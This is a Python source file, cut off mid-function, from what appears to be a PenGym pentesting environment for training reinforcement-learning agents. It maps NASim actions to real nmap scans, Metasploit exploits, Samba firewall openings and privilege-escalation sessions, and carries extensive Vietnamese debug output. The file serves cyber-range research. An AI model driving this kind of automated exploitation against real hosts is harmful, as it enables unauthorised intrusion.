
# Import libraries
import time
import logging
import numpy as np

from nasim.envs.host_vector import HostVector
from nasim.envs.action import ActionResult
from nasim.envs.utils import AccessLevel
from pengym.storyboard import Storyboard
from pymetasploit3.msfrpc import MeterpreterSession, ShellSession

import pengym.utilities as utils

storyboard = Storyboard()

class PenGymHostVector(HostVector):
    """A Vector representation of a single host in PenGym derived from the NASim HostVector class

    Args:
        HostVector: HostVector Class from NASim
    """

    # Perform action (overrides super class function)
    def perform_action(self, action):
        """Perform given action on this host. This function overrides the perform_action() function in NASim HostVector.

        Args:
            action (Action): The action to perform

        Returns:
            PenGymHostVector: The resulting state of host after action
            ActionObservation: The result of the action
        """

        # Get the subnet firewall configuration in scenario
        firewall = utils.scenario.firewall

        # Get address space in scenario
        address_space = utils.scenario.address_space

        # Get list of services in scenario
        scenario_services = utils.scenario.services

        # Get list of os in scenario
        scenario_os = utils.scenario.os

        # Get list of process in scenario
        scenario_processes = utils.scenario.processes

        # Reset the value of PenGym Error
        utils.PENGYM_ERROR = False

        # Get list of available port/ports in the current host in scenario
        host_services_dict = utils.scenario.hosts[self.address].services

        if utils.ENABLE_PENGYM:
            ports = utils.map_services_to_ports(host_services_dict)

            # Map host address to IP address
            host_ip_list = utils.map_host_address_to_IP_address(utils.host_map, self.address)

        # Set tags to differentiate between PenGym and NASim actions
        # only if both of them are enabled
        if utils.ENABLE_PENGYM and utils.ENABLE_NASIM:
            tag_pengym = storyboard.TAG_PENGYM
            tag_nasim = storyboard.TAG_NASIM
        else:
            tag_pengym = ""
            tag_nasim = ""

        ###########################################################################################
        ###########################################################################################
        # Execute actions by following the order in NASim host_vector.py
        # Copy the next state for future purposes
        next_state = self.copy()

        ###########################################################################################
        # Perform ServiceScan
        if action.is_service_scan():

            # PenGym execution
            if utils.ENABLE_PENGYM:
                start = time.time()
                service_dict = None
                service_result = None
                service_list = list()

                service_dict = utils.host_map[self.address][storyboard.SERVICES]
                service_scan_state = utils.host_map[self.address][storyboard.SERVICE_SCAN_STATE]

                if service_scan_state:
                    # Do service scan for each IP address of host
                    for host_ip in host_ip_list:
                        service_result, service_exec_time = self.do_service_scan(host_ip, utils.nmap_scanner, ports)
                        if service_result:
                            service_list.append(service_result)

                    # Transform to compatible NASim result format
                    service_list = [item for sublist in service_list for item in sublist]
                
                    if service_list:
                        service_dict = utils.map_result_list_to_dict(service_list, scenario_services)
                        utils.host_map[self.address][storyboard.SERVICES] = service_dict

                    utils.host_map[self.address][storyboard.SERVICE_SCAN_STATE] = False
                else:
                    end = time.time()
                    service_exec_time = end - start

                # Print the result of the PenGym action
                if service_dict:
                    result = ActionResult(True, services=service_dict)
                    print(f"  Host {self.address} Action '{action.name}' SUCCESS: services={service_dict} Execution Time: {service_exec_time:1.6f}{tag_pengym}")
                else:
                    logging.warning(f"Result of do_service_scan(): {service_result}")
                    result = ActionResult(False, undefined_error=True) # connection_error may be more appropriate
                    utils.PENGYM_ERROR = True
                    utils.print_failure(action, result, storyboard.PENGYM, service_exec_time)

            # NASim execution (NOTE: next_state is not modified)
            if utils.ENABLE_NASIM:
                filtered_services = self.filter_permission_services(action, firewall, address_space) # Get the permitted services
                start = time.time()
                result = ActionResult(True, services=filtered_services) # NASim code: ActionResult(True, 0, services=self.services)
                end = time.time()
                print(f"  Host {self.address} Action '{action.name}' SUCCESS: services={result.services} Execution Time: {end-start:1.6f}{tag_nasim}")

            return next_state, result


        ###########################################################################################
        # Perform OSScan
        if action.is_os_scan():

            # PenGym execution
            if utils.ENABLE_PENGYM:
                start = time.time()
                os_result_dict = None
                os_result = None

                os_result_dict = utils.host_map[self.address][storyboard.OS]
                os_scan_state = utils.host_map[self.address][storyboard.OS_SCAN_STATE]

                if (os_result_dict is None and os_scan_state):
                    # Do OS scan for each IP address of host
                    for host_ip in host_ip_list:
                        os_result, osscan_exec_time = self.do_os_scan(host_ip, utils.nmap_scanner, ports)
                        if (os_result):
                            # Transform to compatible Nasim result format
                            os_result_dict = utils.map_result_list_to_dict(os_result, scenario_os)
                            utils.host_map[self.address][storyboard.OS] = os_result_dict
                            break

                    utils.host_map[self.address][storyboard.OS_SCAN_STATE] = False

                else:
                    end = time.time()
                    osscan_exec_time = end - start

                # Print the result of action of Pengym
                if os_result_dict:
                    result = ActionResult(True, os=os_result_dict)
                    print(f"  Host {self.address} Action '{action.name}' SUCCESS: os={result.os} Execution Time: {osscan_exec_time:1.6f}{tag_pengym}")
                else:
                    logging.warning(f"Result of do_os_scan(): {os_result}")
                    result = ActionResult(False, undefined_error=True) # connection_error may be more appropriate
                    utils.PENGYM_ERROR = True
                    utils.print_failure(action, result, storyboard.PENGYM, osscan_exec_time)

            # NASim execution (NOTE: next_state is not modified)
            if utils.ENABLE_NASIM:
                start = time.time()
                if self.check_allowed_traffic(action, firewall, address_space, host_services_dict):
                    result = ActionResult(True, os=self.os) # NASim code: ActionResult(True, 0, os=self.os)
                    end = time.time()
                    print(f"  Host {self.address} Action '{action.name}' SUCCESS: os={result.os} Execution Time: {end-start:1.6f}{tag_nasim}")
                else:
                    result = ActionResult(False, undefined_error=True) # connection_error may be more appropriate
                    end = time.time()
                    utils.print_failure(action, result, storyboard.NASIM, end-start)

            return next_state, result


        ###########################################################################################
        # Perform Exploit
        if action.is_exploit():
        
            # PenGym execution
            if utils.ENABLE_PENGYM:
                print(f"[DEBUG EXPLOIT] Bắt đầu thực hiện action '{action.name}' trên host {self.address} với service={action.service}")
                
                start = time.time()
        
                # Get status of bridge in current host
                bridge_up = utils.host_map[self.address][storyboard.BRIDGE_UP]
                print(f"[DEBUG EXPLOIT] Trạng thái bridge: bridge_up={bridge_up}")
        
                # Get status of host compromised in current subnet
                has_host_compromised = utils.check_host_compromised_within_subnet(self.address[0])
                print(f"[DEBUG EXPLOIT] Subnet {self.address[0]} đã có host bị xâm nhập: {has_host_compromised}")
        
                # Get status of available default gw in current host and update default gw
                default_gw = utils.host_map[self.address][storyboard.DEFAULT_GW]
                print(f"[DEBUG EXPLOIT] Default gateway hiện tại: {default_gw}")
                if (not default_gw):
                    print(f"[DEBUG EXPLOIT] Kiểm tra và cập nhật gateway cho host {self.address}")
                    utils.check_and_update_available_gw(self.address)
        
                # Get the state of exploit action
                service_exploit_state = utils.host_map[self.address][storyboard.SERVICE_EXPLOIT_STATE]
                print(f"[DEBUG EXPLOIT] Trạng thái SERVICE_EXPLOIT_STATE: {service_exploit_state}")
        
                # Hiển thị trạng thái exploit hiện tại
                if action.service in utils.host_map[self.address][storyboard.EXPLOIT_ACCESS]:
                    current_access = utils.host_map[self.address][storyboard.EXPLOIT_ACCESS][action.service]
                    print(f"[DEBUG EXPLOIT] Trạng thái EXPLOIT_ACCESS hiện tại cho {action.service}: {current_access}")
                else:
                    print(f"[DEBUG EXPLOIT] Chưa có thông tin EXPLOIT_ACCESS cho {action.service}")
        
                # Execute the exploit if exploit status is None
                # Or the exploit action need to be re-executed on this host
                print(f"[DEBUG EXPLOIT] Kiểm tra điều kiện thực hiện exploit...")
                need_exploit = (action.service not in utils.host_map[self.address][storyboard.EXPLOIT_ACCESS] or 
                              (service_exploit_state and utils.host_map[self.address][storyboard.EXPLOIT_ACCESS][action.service] is None))
                print(f"[DEBUG EXPLOIT] Cần thực hiện exploit: {need_exploit}")
                
                if need_exploit:
                    print(f"[DEBUG EXPLOIT] Thực hiện exploit trên các IP: {host_ip_list}")
                    for host_ip in host_ip_list:
                        print(f"[DEBUG EXPLOIT] Thử thực hiện exploit trên IP: {host_ip}")
        
                        # Check if do e_samba with valid condition -> open firewall as temporary solution
                        if action.service == utils.storyboard.SAMBA:
                            # Check the permission of samba service in target host
                            filtered_services = self.filter_permission_services(action, firewall, address_space)
                            print(f"[DEBUG EXPLOIT] Dịch vụ được phép (filtered_services): {filtered_services}")
                            if filtered_services[utils.storyboard.SAMBA] == 1.0:
                                print(f"[DEBUG EXPLOIT] Mở firewall cho SAMBA trên host {self.address}")
                                utils.open_firewall_rule_e_samba(self.address)
        
                        print(f"[DEBUG EXPLOIT] Gọi hàm do_exploit({host_ip}, {host_ip_list}, {action.service})")
                        exploit_result, access, exploit_exec_time = self.do_exploit(host_ip, host_ip_list, action.service)
                        print(f"[DEBUG EXPLOIT] Kết quả do_exploit: result={exploit_result}, access={access}, time={exploit_exec_time}")
        
                        if exploit_result:
                            print(f"[DEBUG EXPLOIT] Exploit thành công, lưu shell và quyền truy cập")
                            # Save the shell
                            if (utils.host_map[self.address][storyboard.SHELL] is None):
                                utils.host_map[self.address][storyboard.SHELL] = exploit_result
                                print(f"[DEBUG EXPLOIT] Đã lưu shell mới cho host {self.address}")
                            utils.host_map[self.address][storyboard.EXPLOIT_ACCESS][action.service] = access
                            print(f"[DEBUG EXPLOIT] Đã lưu quyền truy cập cho {action.service}: {access}")
                            break
                        else:
                            print(f"[DEBUG EXPLOIT] Exploit thất bại cho IP {host_ip}")
                            utils.host_map[self.address][storyboard.EXPLOIT_ACCESS][action.service] = None
        
                    print(f"[DEBUG EXPLOIT] Đặt SERVICE_EXPLOIT_STATE = False sau khi kết thúc vòng lặp")
                    utils.host_map[self.address][storyboard.SERVICE_EXPLOIT_STATE] = False
                else:
                    print(f"[DEBUG EXPLOIT] Sử dụng kết quả exploit đã lưu trước đó")
                    access = utils.host_map[self.address][storyboard.EXPLOIT_ACCESS][action.service]
                    if access:
                        print(f"[DEBUG EXPLOIT] Exploit đã thành công trước đó với quyền: {access}")
                        exploit_result = True
                    else:
                        print(f"[DEBUG EXPLOIT] Exploit đã thất bại trước đó")
                        exploit_result = False
        
                    end = time.time()
                    exploit_exec_time = end - start
        
                # Update state and print the result
                print(f"[DEBUG EXPLOIT] Kết quả cuối cùng: exploit_result={exploit_result}, access={access if exploit_result else None}")
                if exploit_result:
                    print(f"[DEBUG EXPLOIT] Cập nhật trạng thái sau khi exploit thành công")
                    # Update current access level in host_map if needed
                    host_access = utils.host_map[self.address][storyboard.ACCESS]
                    print(f"[DEBUG EXPLOIT] Quyền truy cập hiện tại trong host_map: {host_access}")
                    if (host_access < AccessLevel[access].value):
                        print(f"[DEBUG EXPLOIT] Cập nhật quyền truy cập từ {host_access} thành {AccessLevel[access].value}")
                        utils.host_map[self.address][storyboard.ACCESS] = float(AccessLevel[access].value)
        
                    # Check the bridge status and active bridge
                    activate_link_list = list()
                    if not bridge_up:
                        print(f"[DEBUG EXPLOIT] Kích hoạt bridge cho host {self.address}")
                        activate_link_list = utils.activate_host_bridge(self.address)
                        print(f"[DEBUG EXPLOIT] Danh sách link được kích hoạt: {activate_link_list}")
                        utils.host_map[self.address][storyboard.BRIDGE_UP] = True
        
                    # Update the service scan state of related hosts
                    print(f"[DEBUG EXPLOIT] Cập nhật trạng thái quét dịch vụ cho các host liên quan")
                    print(f"[DEBUG EXPLOIT] Tham số: subnet={self.address[0]}, has_host_compromised={has_host_compromised}, activate_link_list={activate_link_list}")
                    utils.update_host_service_scan_state(self.address[0], has_host_compromised, activate_link_list)
        
                    # Update the firewall off all hosts within a subnet
                    if not has_host_compromised:
                        print(f"[DEBUG EXPLOIT] Đây là host đầu tiên bị xâm nhập trong subnet {self.address[0]}, cập nhật luật firewall")
                        utils.add_firewall_rules_all_hosts(self.address[0])
                    else:
                        print(f"[DEBUG EXPLOIT] Subnet {self.address[0]} đã có host bị xâm nhập trước đó, không cập nhật lại luật firewall")
        
                    # Set parameters according to NASim code logic
                    value = 0.0
                    next_state.compromised = True
                    print(f"[DEBUG EXPLOIT] Đặt next_state.compromised = True")
                    
                    if not self.access == AccessLevel.ROOT:
                        print(f"[DEBUG EXPLOIT] Host chưa có quyền ROOT, đặt next_state.access = {action.access}")
                        # Ensure that a machine is not rewarded twice and access level does not decrease
                        next_state.access = action.access
                        if action.access == AccessLevel.ROOT:
                            print(f"[DEBUG EXPLOIT] Đạt được quyền ROOT, đặt value = {self.value}")
                            value = self.value
        
                    # Get the services and OS of the current host
                    host_services = utils.host_map[self.address][storyboard.SERVICES]
                    host_os = utils.host_map[self.address][storyboard.OS]
                    print(f"[DEBUG EXPLOIT] Dịch vụ trên host: {host_services}")
                    print(f"[DEBUG EXPLOIT] OS của host: {host_os}")
        
                    #NOTE: In training, for compatibility to NASim, change host_services to self.services and host_os to self.os in ActionResult(...)
                    result = ActionResult(True, value=value, services=host_services, os=host_os, access=access)
                    print(f"[DEBUG EXPLOIT] Tạo ActionResult thành công với access={result.access}")
                    print(f"  Host {self.address} Action '{action.name}' SUCCESS: access={result.access} services={result.services if result.services else None } os={result.os if result.os else None} Execution Time: {exploit_exec_time:1.6f}{tag_pengym}")
                else:
                    print(f"[DEBUG EXPLOIT] Xử lý khi exploit thất bại")
                    logging.warning(f"Result of do_exploit(): exploit_result={exploit_result} access={access}")
                    result = ActionResult(False, undefined_error=True) # connection_error may be more appropriate
                    utils.PENGYM_ERROR = True
                    print(f"[DEBUG EXPLOIT] Đặt PENGYM_ERROR = True")
                    utils.print_failure(action, result, storyboard.PENGYM, exploit_exec_time)
        
            # NASim execution (NOTE: next_state IS modified)
            if utils.ENABLE_NASIM:
                print(f"[DEBUG EXPLOIT] Thực hiện exploit trên NASim")
                start = time.time()
                next_state, result = super().perform_action(action)
                end = time.time()
                if result.success:
                    print(f"[DEBUG EXPLOIT] NASim exploit thành công: access={AccessLevel(result.access)}")
                    print(f"  Host {self.address} Action '{action.name}' SUCCESS: access={AccessLevel(result.access)} services={result.services} os={result.os} Execution Time: {end-start:1.6f}{tag_nasim}")
                else:
                    print(f"[DEBUG EXPLOIT] NASim exploit thất bại")
                    utils.print_failure(action, result, storyboard.NASIM, end-start)
        
            print(f"[DEBUG EXPLOIT] Kết thúc xử lý exploit, trả về next_state và result")
            return next_state, result


        ###########################################################################################
        # Perform ProcessScan
        if action.is_process_scan():
            # Debug: In ra thông tin hành động
            print(f"[DEBUG] Đang thực hiện process_scan trên host {self.address}")
            print(f"[DEBUG] ENABLE_PENGYM: {utils.ENABLE_PENGYM}, ENABLE_NASIM: {utils.ENABLE_NASIM}")
        
            # PenGym execution
            if utils.ENABLE_PENGYM:
                print(f"[DEBUG] Bắt đầu quá trình PenGym process_scan")
                start = time.time()
                process_dict = dict()
        
                # Debug: Kiểm tra host_map có chứa host hiện tại không
                if self.address in utils.host_map:
                    print(f"[DEBUG] Host {self.address} được tìm thấy trong host_map")
                else:
                    print(f"[DEBUG] CẢNH BÁO: Host {self.address} không có trong host_map")
        
                # Debug: Kiểm tra và hiển thị thông tin về host trong host_map
                print(f"[DEBUG] Dữ liệu host từ host_map: {utils.host_map.get(self.address, 'Không có')}")
                
                process_dict = utils.host_map[self.address][storyboard.PROCESSES]
                print(f"[DEBUG] process_dict ban đầu: {process_dict}")
        
                if (process_dict is None):
                    print(f"[DEBUG] Không tìm thấy thông tin process, thực hiện quét mới")
                    process_result, processcan_exec_time = self.do_process_scan()
                    print(f"[DEBUG] Kết quả quét process: {process_result}")
                    print(f"[DEBUG] Thời gian quét: {processcan_exec_time}")
                    
                    process_list = list()
        
                    if (process_result):
                        print(f"[DEBUG] Đã nhận được kết quả quét, bắt đầu lọc và chuyển đổi")
                        print(f"[DEBUG] Các process trong kịch bản: {scenario_processes}")
                        
                        # Get list of running process of target host after scanning that compatibles with processes from scenario
                        for process in process_result:
                            print(f"[DEBUG] Đang xử lý process: {process}")
                            for scenario_process_name in scenario_processes:
                                if scenario_process_name in process:
                                    process_list.append(scenario_process_name)
                                    print(f"[DEBUG] Đã tìm thấy process phù hợp: {scenario_process_name}")
        
                        print(f"[DEBUG] Danh sách process sau khi lọc: {process_list}")
                        
                        # Transform to compatible Nasim result format
                        process_dict = utils.map_result_list_to_dict(process_list, scenario_processes)
                        print(f"[DEBUG] process_dict sau khi chuyển đổi: {process_dict}")
        
                        # Cập nhật thông tin vào host_map
                        utils.host_map[self.address][storyboard.PROCESSES] = process_dict
                        print(f"[DEBUG] Đã cập nhật thông tin process vào host_map")
        
                else:
                    print(f"[DEBUG] Đã có thông tin process trong host_map, sử dụng lại")
                    end = time.time()
                    processcan_exec_time = end - start
                    print(f"[DEBUG] Thời gian xử lý: {processcan_exec_time}")
        
                # Print the result
                if process_dict:
                    print(f"[DEBUG] Tìm thấy process_dict, lấy thông tin truy cập")
        
                    # Get the access level of the current host
                    host_access = utils.host_map[self.address][storyboard.ACCESS]
                    print(f"[DEBUG] Mức truy cập của host: {host_access}")
        
                    result = ActionResult(True, access=host_access, processes=process_dict)
                    print(f"  Host {self.address} Action '{action.name}' SUCCESS: processes={result.processes} access={AccessLevel(result.access)} Execution Time: {processcan_exec_time:1.6f}{tag_pengym}")
                else:
                    print(f"[DEBUG] Không tìm thấy process_dict, ghi nhận thất bại")
                    logging.warning(f"Result of do_process_scan(): {process_list}, Host map: {utils.host_map}")
                    result = ActionResult(False, undefined_error=True)
                    utils.PENGYM_ERROR = True
                    print(f"[DEBUG] Đã đặt PENGYM_ERROR = True")
                    utils.print_failure(action, result, storyboard.PENGYM, processcan_exec_time)
        
            # NASim execution (NOTE: next_state is not modified)
            if utils.ENABLE_NASIM:
                print(f"[DEBUG] Bắt đầu quá trình NASim process_scan")
                start = time.time()
                # Debug: In ra thông tin truy cập và process của host trong NASim
                print(f"[DEBUG] NASim access level: {self.access}")
                print(f"[DEBUG] NASim processes: {self.processes}")
                
                result = ActionResult(True, access=self.access, processes=self.processes) # NASim code: ActionResult(True, 0, access=self.access, processes=self.processes)
                end = time.time()
                print(f"  Host {self.address} Action '{action.name}' SUCCESS: processes={result.processes} access={AccessLevel(result.access)} Execution Time: {end-start:1.6f}{tag_nasim}")
        
            print(f"[DEBUG] process_scan hoàn thành trên host {self.address}")
            return next_state, result


        ###########################################################################################
        # Perform PrivilegeEscalation
        if action.is_privilege_escalation():
            # Debug: In thông tin ban đầu
            print(f"[DEBUG] Đang thực hiện privilege_escalation trên host {self.address}")
            print(f"[DEBUG] Process mục tiêu: {action.process}")
            print(f"[DEBUG] ENABLE_PENGYM: {utils.ENABLE_PENGYM}, ENABLE_NASIM: {utils.ENABLE_NASIM}")
        
            # PenGym execution
            if utils.ENABLE_PENGYM:
                print(f"[DEBUG] Bắt đầu quá trình PenGym privilege_escalation")
                start = time.time()
        
                # Debug: Kiểm tra trạng thái bridge
                bridge_up = utils.host_map[self.address][storyboard.BRIDGE_UP]
                print(f"[DEBUG] Trạng thái bridge hiện tại: {'UP' if bridge_up else 'DOWN'}")
        
                # Debug: Kiểm tra thông tin về PE_SHELL
                print(f"[DEBUG] PE_SHELL hiện tại: {utils.host_map[self.address][storyboard.PE_SHELL]}")
                
                # Debug: Kiểm tra xem đã thực hiện PE cho process này chưa
                if (action.process not in utils.host_map[self.address][storyboard.PE_SHELL]):
                    print(f"[DEBUG] Chưa thực hiện PE cho process {action.process}, bắt đầu thực hiện")
                    
                    # Thực hiện privilege escalation
                    pe_result, access, pe_exec_time = self.do_privilege_escalation(host_ip_list, action.process)
                    print(f"[DEBUG] Kết quả PE: {pe_result}, Access: {access}, Thời gian: {pe_exec_time}")
                    
                    # Lưu kết quả vào host_map
                    if pe_result:
                        utils.host_map[self.address][storyboard.PE_SHELL][action.process] = pe_result
                        print(f"[DEBUG] Đã lưu PE_SHELL thành công cho process {action.process}")
                    else:
                        utils.host_map[self.address][storyboard.PE_SHELL][action.process] = None
                        print(f"[DEBUG] Đã lưu PE_SHELL thất bại cho process {action.process}")
                else:
                    # Sử dụng lại kết quả PE đã có
                    print(f"[DEBUG] Đã thực hiện PE cho process {action.process} trước đó, sử dụng lại kết quả")
                    pe_result = utils.host_map[self.address][storyboard.PE_SHELL][action.process]
                    
                    # Thiết lập access dựa trên kết quả PE
                    if pe_result:
                        access = storyboard.ROOT
                        print(f"[DEBUG] PE đã thành công trước đó, access = {access}")
                    else:
                        access = None
                        print(f"[DEBUG] PE đã thất bại trước đó, access = None")
        
                    # Tính thời gian xử lý
                    end = time.time()
                    pe_exec_time = end - start
                    print(f"[DEBUG] Thời gian xử lý: {pe_exec_time}")
        
                # Debug: Kết quả PE sau khi xử lý
                print(f"[DEBUG] Kết quả PE cuối cùng: {pe_result}, Access: {access}")
        
                # Update state and print the result
                if pe_result:
                    print(f"[DEBUG] PE thành công, cập nhật trạng thái")
        
                    # Debug: Cập nhật mức truy cập
                    host_access = utils.host_map[self.address][storyboard.ACCESS]
                    print(f"[DEBUG] Mức truy cập hiện tại: {host_access}, Mức mới: {AccessLevel[access].value}")
        
                    # Cập nhật mức truy cập nếu cao hơn
                    if (host_access < AccessLevel[access].value):
                        utils.host_map[self.address][storyboard.ACCESS] = float(AccessLevel[access].value)
                        print(f"[DEBUG] Đã cập nhật mức truy cập thành {AccessLevel[access].value}")
                    else:
                        print(f"[DEBUG] Giữ nguyên mức truy cập {host_access}")
        
                    # Debug: Kiểm tra và kích hoạt bridge
                    if not bridge_up:
                        print(f"[DEBUG] Bridge DOWN, tiến hành kích hoạt")
                        utils.activate_host_bridge(self.address)
                        utils.host_map[self.address][storyboard.BRIDGE_UP] = True
                        print(f"[DEBUG] Đã kích hoạt bridge thành công")
                    else:
                        print(f"[DEBUG] Bridge đã UP, không cần kích hoạt lại")
        
                    # Debug: Tính toán giá trị
                    value = 0.0
                    if not self.access == AccessLevel.ROOT:
                        print(f"[DEBUG] Mức truy cập hiện tại khác ROOT, cập nhật next_state")
                        next_state.access = action.access
                        if action.access == AccessLevel.ROOT:
                            value = self.value
                            print(f"[DEBUG] Đạt mức ROOT, nhận giá trị thưởng: {value}")
        
                    # Debug: Lấy thông tin processes và OS
                    host_processes = utils.host_map[self.address][storyboard.PROCESSES]
                    host_os = utils.host_map[self.address][storyboard.OS]
                    print(f"[DEBUG] Thông tin processes: {host_processes}")
                    print(f"[DEBUG] Thông tin OS: {host_os}")
        
                    # Tạo kết quả
                    result = ActionResult(True, value=value, processes=host_processes, os=host_os, access=access)
                    print(f"[DEBUG] Đã tạo ActionResult thành công")
                    print(f"  Host {self.address} Action '{action.name}' SUCCESS: access={result.access} processes={result.processes if result.processes else None } os={result.os if result.os else None} Execution Time: {pe_exec_time:1.6f}{tag_pengym}")
                else:
                    print(f"[DEBUG] PE thất bại, ghi log và báo lỗi")
                    logging.warning(f"Result of do_privilege_escalation(): action_success={pe_result} access_result={access}")
                    result = ActionResult(False, undefined_error=True)
                    utils.PENGYM_ERROR = True
                    print(f"[DEBUG] Đã đặt PENGYM_ERROR = True")
                    utils.print_failure(action, result, storyboard.PENGYM, pe_exec_time)
        
            # NASim execution (NOTE: next_state IS modified)
            if utils.ENABLE_NASIM:
                print(f"[DEBUG] Bắt đầu quá trình NASim privilege_escalation")
                start = time.time()
                
                # Debug: Thông tin trước khi gọi super()
                print(f"[DEBUG] NASim - Trạng thái host trước khi thực hiện: access={AccessLevel(self.access)}")
                
                # Gọi phương thức của lớp cha
                next_state, result = super().perform_action(action)
                
                # Debug: Thông tin kết quả sau khi gọi super()
                print(f"[DEBUG] NASim - Kết quả: success={result.success}, access={AccessLevel(result.access) if result.success else 'N/A'}")
                
                end = time.time()
                pe_exec_time = end - start
                print(f"[DEBUG] NASim - Thời gian thực thi: {pe_exec_time}")
                
                if result.success:
                    print(f"  Host {self.address} Action '{action.name}' SUCCESS: access={AccessLevel(result.access)} processes={result.processes} os={result.os} Execution Time: {end-start:1.6f}{tag_nasim}")
                else:
                    utils.print_failure(action, result, storyboard.NASIM, end-start)
        
            print(f"[DEBUG] privilege_escalation hoàn thành trên host {self.address}")
            return next_state, result


        ###########################################################################################
        # Try to perform any unsupported actions (only happens if new actions are introduced in NASim)
        next_state, result = super().perform_action(action)
        logging.warning(f"Unsupported action '{action.name}': result={result}")
        return next_state, result


    ###################################################################################
    def copy(self):
        """Copy the state itself and cast to PenGymHostVector

        Returns:
            PenGymHostVector: State of this host
        """
        copyVector = super().copy()
        penGymVector = PenGymHostVector(copyVector.vector)
        return penGymVector

    ###################################################################################
    def check_allowed_traffic(self, action, firewall, addr_space, host_services_dict):
        """Check if there is any allowed service available
        between the source host and the target host

        Args:
            action (Action): The action to perform
            firewall (dict): The subnet firewall configuration in this scenario
            addr_space (list): The list of address space (all host address) in this scenario
            host_services_dict (dict): The list of available port/ports in the current host in the scenario

        Returns:
            (bool): True if there is an allowed service available between the source host and the target host
        """

        traffic_allow = False
        allowed_services = list()

        # Check is the target host belong to a public subnet
        # Check the permission of communication between public subnet and the Internet
        if (utils.scenario.topology[action.target[0]][0] == 1) and (len(firewall[(0,action.target[0])]) != 0):
            allowed_services = firewall[(0,action.target[0])]

            for host_service_item in host_services_dict.keys():
                if (host_services_dict[host_service_item]) and host_service_item in allowed_services:
                    traffic_allow = True
                    break

        # Check the permission of communication between source host (compromised and connected host) to the target host
        for src_addr in addr_space:
            if utils.current_state.host_compromised(src_addr):
                # Case: Source host and target host are in the same subnet
                if (src_addr[0] == action.target[0]):
                    traffic_allow = True
                    break
                else:
                    # Case: Source host and target host are not in the same subnet
                    link = (src_addr[0], action.target[0])
                    if link in firewall and len(firewall[link]) != 0:
                        allowed_services = firewall[link]
                        
                        for host_service_item in host_services_dict.keys():
                            if (host_services_dict[host_service_item]) and host_service_item in allowed_services:
                                traffic_allow = True
                                break

        return traffic_allow
    
    ###################################################################################
    def filter_permission_services(self, action, firewall, addr_space):
        """Filter the permitted servies between source hosts and target

            Args:
                action (Action): The action to perform
                firewall (dict): The subnet firewall configuration in this scenario
                addr_space (list): The list of address space (all host address) in this scenario

            Returns:
                filtered_services (dict): Permitted servies between source hosts and target host
        """

        allowed_services = list()
        filtered_services = dict()
        
        # Check is the target host belong to a public subnet
        # Check the allowed services between public subnet and the Internet
        if utils.scenario.topology[action.target[0]][0] == 1:
            link_allow_service = firewall[(0,action.target[0])]
            allowed_services = allowed_services + link_allow_service

        # Get the permitted services between source host (compromised and connected host) to the target host
        for src_addr in addr_space:
            link_allow_service = list()
            
            if utils.current_state.host_compromised(src_addr):
                # Case: Source host and target host are in the same subnet
                if (src_addr[0] == action.target[0]):
                    allowed_services = list(self.services.keys())
                    break
                else:
                    # Case: Source host and target host are not in the same subnet
                    link = (src_addr[0], action.target[0])
                    
                    if link in firewall:
                        link_allow_service = firewall[link]
                        allowed_services = allowed_services + link_allow_service

        # Map result to dictionary
        for service, value in self.services.items():
            if service in allowed_services:
                filtered_services[service] = value
            else:
                filtered_services[service] = np.float32(False)

        return filtered_services

    ###################################################################################
    def parse_exploit_result(self, result):
        """Parse the results of the exploit and return the job id on success

        Args:
            result (dict) : result from executing module in metasploit

        Returns:
            job_id (str): index of job
        """

        JOB_ID_KEY = "job_id"
        ERROR_KEY = "error"
        ERROR_MESSAGE_KEY = "error_message"

        # Check for correct execution
        if JOB_ID_KEY in result:
            job_id = result[JOB_ID_KEY]
            if job_id is not None:
                return str(job_id) # Must return a string, not an int
            else:
                logging.warning(f"Execution failed: job id is '{job_id}'")
                return None

        # Check for errors
        elif ERROR_KEY in result and result[ERROR_KEY]:
            if ERROR_MESSAGE_KEY in result:
                logging.warning(f"Execution returned an error: {result[ERROR_MESSAGE_KEY]}")
            else:
                logging.warning(f"Execution returned an error")

        return None

    ###################################################################################
    def get_current_shell_id(self, msfrpc, host_ip_list, exploit_name = None, arch=None):
        """Get shell id of the host in session list that corresponding to current acction

        Args:
            msfrpc (MsfRpcClient) : msfrpc client
            host_ip_list (list): List of host IP addresses
            exploit_name (str): Name of service that is used to exploit
            arch (str): Architecture of shell

        Returns:
            session_key (str): shell id of current host
        """
        
        TYPE_KEY = "type"
        ARCH = "arch"
        SHELL_VALUE = "shell"
        TARGET_HOST_KEY = "target_host"
        EXPLOIT_NAME = "via_exploit"
        TUNNEL_PEER = "tunnel_peer"
        
        for session_key, session_details in msfrpc.sessions.list.items():
            if TYPE_KEY in session_details and TARGET_HOST_KEY in session_details and EXPLOIT_NAME in session_details and TUNNEL_PEER in session_details:
                tunnel_ip = session_details[TUNNEL_PEER].split(':')[0]

                if session_details[TYPE_KEY] == SHELL_VALUE:
                    if arch and arch not in session_details[ARCH]:
                            continue
                    
                    if exploit_name:
                        if exploit_name in session_details[EXPLOIT_NAME]:
                            if (session_details[TARGET_HOST_KEY] in host_ip_list) and (tunnel_ip in host_ip_list):
                                return session_key
                    else:
                        if (session_details[TARGET_HOST_KEY] in host_ip_list) and (tunnel_ip in host_ip_list):
                            return session_key

        return None

    ###################################################################################
    def get_existed_meterpreter_id(self, msfrpc, host, exploit_name = None):
        """Get existing meterpreter id of the host in session list

        Args:
            msfrpc (MsfRpcClient) : msfrpc client
            host (str): host ip address
            exploit_name (str): Name of process that is used to exploit

        Returns:
            session_key (str): meterpreter id of current host
        """
        TYPE_KEY = "type"
        ROOT_LEVEL = "root"
        METERPRETER_VALUE = "meterpreter"
        SESSION_HOST_KEY = "session_host"
        INFO_KEY = "info"
        EXPLOIT_NAME = "via_exploit"
        
        for session_key, session_details in msfrpc.sessions.list.items():
            if TYPE_KEY in session_details and SESSION_HOST_KEY in session_details and EXPLOIT_NAME in session_details:
                if session_details[TYPE_KEY] == METERPRETER_VALUE:
                    if exploit_name:

                        if exploit_name in session_details[EXPLOIT_NAME]:
                            if (host == session_details[SESSION_HOST_KEY] or host in session_details[INFO_KEY]) and ROOT_LEVEL in session_details[INFO_KEY]:
                                return session_key

                    else:
                        if (host == session_details[SESSION_HOST_KEY] or host in session_details[INFO_KEY]) and ROOT_LEVEL in session_details[INFO_KEY]:
                            return session_key

        return None

    ###################################################################################
    def get_access_level(self, shell):
        """Get access level of the current host

        Args
        ---------
        shell (ShellSession/MeterpreterSession) : shell session

        Returns
        -------
        access (str): access level of current host
        """

        WHOAMI_CMD = 'whoami'
        GET_UID_CMD = 'getuid'

        if (isinstance(shell, ShellSession)):
            shell.write(WHOAMI_CMD)
        elif (isinstance(shell, MeterpreterSession)):
